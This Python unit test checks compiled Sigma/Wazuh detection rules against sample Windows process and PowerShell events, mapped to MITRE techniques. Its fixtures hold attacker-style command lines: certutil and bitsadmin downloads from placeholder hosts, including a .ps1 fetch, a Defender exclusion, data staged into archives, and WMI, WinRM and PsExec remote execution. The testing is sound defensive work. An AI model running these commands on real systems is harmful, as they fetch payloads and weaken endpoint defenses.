#!/usr/bin/env python3
# ===========================================================================
# sigma-selftest.py — offline unit test for the COMPILED Sigma rules.
#
# Emulates Wazuh's field evaluation (every <field> AND'd; type="pcre2"; the
# negate="yes" attribute inverts a field) against hand-written sample events and
# asserts each rule fires on a true positive and stays quiet on look-alikes.
#
# This complements purple-team.py (live fire on ws-01), and is the ONLY
# automated proof for rules whose technique a defensive control blocks from
# executing on the lab host at all — e.g. T1105 certutil download, which
# Microsoft Defender kills before the process spawns (so there is no telemetry
# to detect; that block is itself a defense-in-depth finding, documented in
# README.md). It needs no VM and makes the detection logic reproducible.
#
#   ./sigma-selftest.py   # exit 0 = all cases pass, 1 = a case failed (CI gate)
# ===========================================================================
import os
import re
import sys
import xml.etree.ElementTree as ET

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
RULES_XML = os.path.join(REPO, "phase-7-automation/ansible/roles/siem/files/sigma_local_rules.xml")

root = ET.fromstring(open(RULES_XML).read())


def rule_matches(rid, ev):
    """True iff every <field> of rule `rid` matches the event (Wazuh AND semantics)."""
    rule = next((r for r in root.findall("rule") if r.get("id") == rid), None)
    if rule is None:
        raise SystemExit(f"rule {rid} not found in {RULES_XML} — recompile first")
    for f in rule.findall("field"):
        hit = re.search(f.text, ev.get(f.get("name"), "")) is not None
        if f.get("negate") == "yes":
            hit = not hit
        if not hit:
            return False
    return True


CERTUTIL = r"C:\Windows\System32\certutil.exe"
# (description, rule_id, event, expected_fire)
CASES = [
    # T1105 — certutil download (upstream SigmaHQ rule). Not live-fireable: Defender
    # blocks certutil download on the lab host, so this is its detection proof.
    ("certutil urlcache download (image variant)", "100500",
     {"win.eventdata.image": CERTUTIL, "win.eventdata.originalFileName": "CertUtil.exe",
      "win.eventdata.commandLine": "certutil  -urlcache -split -f https://raw.githubusercontent.com/x/LICENSE.txt out.txt"}, True),
    ("certutil verifyctl download (origname variant)", "100501",
     {"win.eventdata.image": CERTUTIL, "win.eventdata.originalFileName": "CertUtil.exe",
      "win.eventdata.commandLine": "certutil -verifyctl -split -f http://10.0.0.1/a.bin b.bin"}, True),
    ("benign certutil -hashfile (no download) — precision", "100500",
     {"win.eventdata.image": CERTUTIL, "win.eventdata.originalFileName": "CertUtil.exe",
      "win.eventdata.commandLine": "certutil -hashfile report.docx SHA256"}, False),
    ("certutil urlcache but no http (local path) — precision", "100500",
     {"win.eventdata.image": CERTUTIL, "win.eventdata.originalFileName": "CertUtil.exe",
      "win.eventdata.commandLine": "certutil -urlcache -split -f \\\\server\\share\\a.txt b.txt"}, False),
    # T1057 — process discovery (tasklist)
    ("tasklist (originalFileName variant)", "100502",
     {"win.eventdata.originalFileName": "tasklist.exe",
      "win.eventdata.image": r"C:\Windows\System32\tasklist.exe",
      "win.eventdata.commandLine": "tasklist /v"}, True),
    ("tasklist (image variant)", "100503",
     {"win.eventdata.originalFileName": "", "win.eventdata.image": r"C:\Windows\System32\tasklist.exe",
      "win.eventdata.commandLine": "tasklist"}, True),
    # T1033 — system owner/user discovery (whoami/quser/qwinsta)
    ("whoami (originalFileName variant)", "100504",
     {"win.eventdata.originalFileName": "whoami.exe", "win.eventdata.image": r"C:\Windows\System32\whoami.exe",
      "win.eventdata.commandLine": "whoami /priv"}, True),
    ("qwinsta (image variant)", "100505",
     {"win.eventdata.originalFileName": "", "win.eventdata.image": r"C:\Windows\System32\qwinsta.exe",
      "win.eventdata.commandLine": "qwinsta"}, True),
    ("powershell (not a user-discovery binary) — precision", "100504",
     {"win.eventdata.originalFileName": "PowerShell.EXE", "win.eventdata.image": r"C:\...\powershell.exe",
      "win.eventdata.commandLine": "powershell whoami"}, False),
    # T1082 — system information discovery (systeminfo)
    ("systeminfo (originalFileName variant)", "100509",
     {"win.eventdata.originalFileName": "systeminfo.exe", "win.eventdata.image": r"C:\Windows\System32\systeminfo.exe",
      "win.eventdata.commandLine": "systeminfo"}, True),
    # T1007 — system service discovery (sc query) — needs sc.exe AND a query verb
    ("sc query (bin + verb)", "100507",
     {"win.eventdata.originalFileName": "sc.exe", "win.eventdata.image": r"C:\Windows\System32\sc.exe",
      "win.eventdata.commandLine": "sc query state= all"}, True),
    ("sc create (bin, wrong verb) — precision", "100507",
     {"win.eventdata.originalFileName": "sc.exe", "win.eventdata.image": r"C:\Windows\System32\sc.exe",
      "win.eventdata.commandLine": "sc create evil binPath= C:\\evil.exe"}, False),
    # T1197 — BITS Jobs download (bitsadmin) — needs bitsadmin.exe AND a transfer verb.
    # TP event mirrors the live Atomic T1197-1 command line surfaced by the rare-process hunt.
    ("bitsadmin /transfer download (image variant)", "100511",
     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
      "win.eventdata.commandLine": "bitsadmin.exe  /transfer /Download /priority Foreground https://x/y C:\\Users\\a\\Temp\\b.ps1"}, True),
    ("bitsadmin /transfer download (originalFileName variant)", "100512",
     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
      "win.eventdata.commandLine": "bitsadmin.exe  /transfer job /addfile http://10.0.0.1/a.exe C:\\a.exe"}, True),
    ("bitsadmin /list (enumerate jobs, no transfer) — precision", "100511",
     {"win.eventdata.image": r"C:\Windows\System32\bitsadmin.exe", "win.eventdata.originalFileName": "bitsadmin.exe",
      "win.eventdata.commandLine": "bitsadmin /list /allusers /verbose"}, False),
    # T1562.001 — Defender exclusion via PowerShell (ps_script, EID 4104) — cmdlet AND -Exclusion*
    ("Add-MpPreference -ExclusionPath (cmdlet + exclusion)", "100506",
     {"win.eventdata.scriptBlockText": "Add-MpPreference -ExclusionPath C:\\Users\\Public"}, True),
    ("Set-MpPreference -DisableRealtimeMonitoring (no exclusion) — precision", "100506",
     {"win.eventdata.scriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true"}, False),
    ("Get-MpPreference (read only, no exclusion) — precision", "100506",
     {"win.eventdata.scriptBlockText": "Get-MpPreference | Select ExclusionPath"}, False),
    # T1569.002 — PsExec service execution (PSEXESVC.exe = the psexec service binary)
    ("PsExec service binary runs (image variant)", "100513",
     {"win.eventdata.image": r"C:\Windows\PSEXESVC.exe",
      "win.eventdata.parentImage": r"C:\Windows\System32\services.exe"}, True),
    ("PsExec service spawns cmd (parentImage variant)", "100514",
     {"win.eventdata.image": r"C:\Windows\System32\cmd.exe",
      "win.eventdata.parentImage": r"C:\Windows\PSEXESVC.exe"}, True),
    ("services.exe starts a normal service (svchost, not PsExec) — precision", "100513",
     {"win.eventdata.image": r"C:\Windows\System32\svchost.exe",
      "win.eventdata.parentImage": r"C:\Windows\System32\services.exe"}, False),
    # T1047 — WMI remote exec: WmiPrvSE.exe spawns a shell (impacket wmiexec / nxc)
    ("wmiexec: WmiPrvSE spawns cmd (parent + child)", "100515",
     {"win.eventdata.parentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
      "win.eventdata.image": r"C:\Windows\System32\cmd.exe"}, True),
    ("WmiPrvSE spawns a non-shell provider child — precision", "100515",
     {"win.eventdata.parentImage": r"C:\Windows\System32\wbem\WmiPrvSE.exe",
      "win.eventdata.image": r"C:\Windows\System32\wbem\WmiApSrv.exe"}, False),
    ("cmd spawned by explorer (local shell, not WMI) — precision", "100515",
     {"win.eventdata.parentImage": r"C:\Windows\explorer.exe",
      "win.eventdata.image": r"C:\Windows\System32\cmd.exe"}, False),
    # T1021.006 — WinRM remote exec: any child of wsmprovhost.exe (evil-winrm / nxc winrm)
    ("winrm: wsmprovhost spawns powershell (any child fires)", "100516",
     {"win.eventdata.parentImage": r"C:\Windows\System32\wsmprovhost.exe",
      "win.eventdata.image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}, True),
    ("powershell spawned by explorer (local, not WinRM) — precision", "100516",
     {"win.eventdata.parentImage": r"C:\Windows\explorer.exe",
      "win.eventdata.image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}, False),
    # T1560.001 — data staged via archive utility (rar/7-Zip) + Compress-Archive
    ("7-Zip archiving (originalFileName variant)", "100517",
     {"win.eventdata.originalFileName": "7z.exe", "win.eventdata.image": r"C:\Program Files\7-Zip\7z.exe",
      "win.eventdata.commandLine": r"7z a -tzip C:\Users\a\stage.zip C:\Users\a\Documents"}, True),
    ("rar.exe archiving (image variant)", "100518",
     {"win.eventdata.originalFileName": "", "win.eventdata.image": r"C:\Users\a\AppData\rar.exe",
      "win.eventdata.commandLine": r"rar a -r stage.rar C:\data"}, True),
    ("cmd.exe (not an archiver) — precision", "100518",
     {"win.eventdata.originalFileName": "Cmd.Exe", "win.eventdata.image": r"C:\Windows\System32\cmd.exe",
      "win.eventdata.commandLine": "cmd /c dir"}, False),
    ("Compress-Archive staging (ps_script)", "100519",
     {"win.eventdata.scriptBlockText": r"Compress-Archive -Path C:\data\* -DestinationPath C:\Users\Public\out.zip"}, True),
    ("Expand-Archive (unzip, not staging) — precision", "100519",
     {"win.eventdata.scriptBlockText": r"Expand-Archive -Path C:\out.zip -DestinationPath C:\tmp"}, False),
]


def main():
    fails = 0
    for desc, rid, ev, expect in CASES:
        got = rule_matches(rid, ev)
        ok = got == expect
        fails += not ok
        print(f"  [{'PASS' if ok else 'FAIL'}] rule {rid}  fire={got!s:5} expect={expect!s:5}  {desc}")
    total = len(CASES)
    print(f"\n== {total - fails}/{total} rule-logic cases pass ==")
    sys.exit(1 if fails else 0)


if __name__ == "__main__":
    main()
